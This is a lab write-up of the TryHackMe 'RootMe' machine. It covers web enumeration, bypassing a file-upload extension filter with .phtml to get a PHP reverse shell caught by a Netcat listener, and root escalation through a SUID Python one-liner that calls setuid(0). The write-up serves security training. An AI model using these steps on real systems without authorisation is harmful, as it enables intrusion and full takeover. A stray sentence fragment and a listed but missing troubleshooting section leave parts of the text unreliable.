# TryHackMe — RootMe

**Platform:** TryHackMe  
**Difficulty:** Easy  
**OS:** Linux  
**Topics:** Nmap, web enumeration, file-upload testing, PHP reverse-shell troubleshooting, SUID privilege escalation

> **Disclaimer:** This write-up documents an authorized TryHackMe training lab for educational purposes. Spoilers ahead.

## Table of Contents

1. [Introduction](#introduction)
2. [Reconnaissance](#1-reconnaissance)
3. [Web Enumeration](#2-web-enumeration)
4. [Initial Access — File Upload](#3-initial-access--file-upload)
5. [Finding the User Flag](#4-finding-the-user-flag)
6. [Privilege Escalation — SUID Python](#5-privilege-escalation--suid-python)
7. [Finding the Root Flag](#6-finding-the-root-flag)
8. [Troubleshooting Notes](#7-troubleshooting-notes)
9. [Lessons Learned](#8-lessons-learned)
10. [References](#references)

## Introduction

RootMe is a beginner-friendly Linux machine that demonstrates how a vulnerable file-upload feature can provide initial access and how a misconfigured SUID executable can lead to root privileges.

The attack chain consists of two main stages:

- **Initial access:** Enumerate the web server, discover the upload functionality, test the file-extension restriction, and obtain a shell as the web server user.
- **Privilege escalation:** Enumerate SUID binaries, identify Python 2.7 as an unusual candidate, and investigate its elevated privileges.

## 1. Reconnaissance

### 1.1 Identify open ports

Deploy the target machine on TryHackMe and connect through the TryHackMe VPN or AttackBox.

Run an Nmap scan:

```bash
nmap -sV [target ip]
```

The expected primary services for this room are:

| Port | Service | Purpose |
|---|---|---|
| 22/tcp | SSH | Remote login |
| 80/tcp | HTTP | Web application |

## 2. Web Enumeration

### 2.1 Inspect the website

Open the target in a browser:

```text
http://TARGET_IP/
```

Inspect the homepage and look for links, application functionality, and useful paths.

### 2.2 Enumerate directories

Use Gobuster or ffuf to discover directories:

```bash
gobuster dir -u http://TARGET_IP/ -w /PATH_TO_WORDLIST/
```

Replace `TARGET_IP` with the target address.

Interesting paths to investigate include:

- `/panel/` — the file-upload page.
- `/uploads/` — a possible location for uploaded files.

Check both paths in the browser. Discovering an upload form is not enough by itself; determine where the uploaded file is stored and whether the server executes it.

## 3. Initial Access — File Upload

### 3.1 Test the upload functionality

The upload form provides a potential route to server-side code execution.

Start by uploading a harmless test file. Check whether the application accepts it and whether the file appears under `/uploads/`.

This verifies the basic upload workflow before testing server-side execution.

### 3.2 Investigate the extension restriction

A file with a `.php` extension may be rejected by the application. This suggests that the application has a file-extension restriction, but blocking one extension does not guarantee that every PHP-capable extension is blocked.

Alternative extensions, such as `.phtml` or `.php5`, may be accepted depending on the application's validation logic and the web server configuration.

### 3.3 Prepare and validate the PHP file

For the authorized lab, use a PHP reverse-shell script and configure it for your attacking machine.

Before testing, verify that:

- The PHP code has valid syntax.
- The callback IP is your attacking machine's reachable VPN address.
- The callback port matches your listener.
- The uploaded extension is accepted by the application.
- The web server is configured to execute that extension as PHP.

Inspect the VPN interface:

```bash
ip addr show tun0
```
Check a local PHP file for syntax errors:

```bash
php -l php-reverse-shell.phtml
```

This checks syntax; it does not execute the shell or prove that the target server will execute the file.

### 3.4 Start a Netcat listener

On the attacking machine, start a listener using the same port configured in your lab payload:

```bash
nc -lvnp 4444
```

Leave the terminal open)

After the file is accepted, access the uploaded file through its URL to test whether the server executes it. If successful, the listener should receive a connection from the target. The initial shell commonly runs as the web server account, such as `www-data`.

## 4. Finding the User Flag

Once you have a shell, identify the current account and groups:

```bash
id
whoami
```

Search for the user flag:

```bash
find / -type f -name user.txt 2>/dev/null
```

```text
/var/www/user.txt
```

Read the file at the path returned by your search:

```bash
cat /var/www/user.txt
```

Record the result in your own lab notes.

## 5. Privilege Escalation — SUID Python

### 5.1 Enumerate SUID files

Search the filesystem for files with the SUID permission bit set:

```bash
find / -type f -perm -4000 2>/dev/null
```

Explanation:

- `find /` searches from the filesystem root.
- `-type f` limits results to regular files.
- `-perm -4000` matches files with the SUID bit set.
- `2>/dev/null` suppresses errors such as permission-denied messages.

SUID can cause an executable to run with the file owner's effective UID. It does not automatically mean every SUID executable is exploitable.

### 5.2 Identify the unusual binary

An important candidate in this room is:

```text
/usr/bin/python2.7
```

Python is a general-purpose interpreter. If a root-owned interpreter has SUID enabled and retains elevated effective privileges when executed, it may be possible to execute code with those privileges.

Inspect the file:

```bash
ls -l /usr/bin/python2.7
```

A permission string such as `-rwsr-xr-x` indicates that the SUID bit is set for the owner.

Check your current identity:

```bash
id
```

The critical condition is that the Python process actually retains an effective UID of root. The filename alone does not prove exploitability.

*Exploit*

```python
python -c 'import os; os.setuid(0); os.system("/bin/bash")'
```


## 6. Finding the Root Flag

After attempting privilege escalation, verify the effective identity:

```bash
id
```

A result showing `euid=0(root)` confirms that the process has an effective UID of root, even if the real UID remains that of the original web server user.

Then find/read the root flag:

```bash
find / -name 'root.txt'
```

```bash
cat /root/root.txt
```

s machine, Python 2.7 is the notable finding.

## 7. Lessons Learned

- **Enumeration comes first.** Port scanning and directory discovery helped identify the web application as the initial entry point.
- **File-extension filtering can be insufficient.** Applications should validate uploads using a strict allowlist rather than relying on a short denylist.
- **Uploaded files should not execute as code.** Uploads should be stored outside executable web directories, or execution should be disabled for the upload directory.
- **SUID enumeration is useful for Linux privilege escalation.** An unusual interpreter with elevated privileges deserves investigation.
- **Effective UID matters.** A process can have a real UID associated with an unprivileged user while retaining an effective UID of root.
- **Troubleshooting is part of the process.** Checking syntax, IP addresses, listeners, file paths, and execution behavior helps isolate failures.

## References

- TryHackMe — RootMe: https://tryhackme.com/room/rrootme
- GTFOBins — Python SUID: https://gtfobins.github.io/gtfobins/python/#suid
- Nmap documentation: https://nmap.org/book/man.html
- Gobuster: https://github.com/OJ/gobuster

---

**Status:** RootMe completed  
**Skills practised:** Network enumeration, web directory discovery, file-upload testing, reverse-shell troubleshooting, Linux SUID enumeration, and privilege escalation.
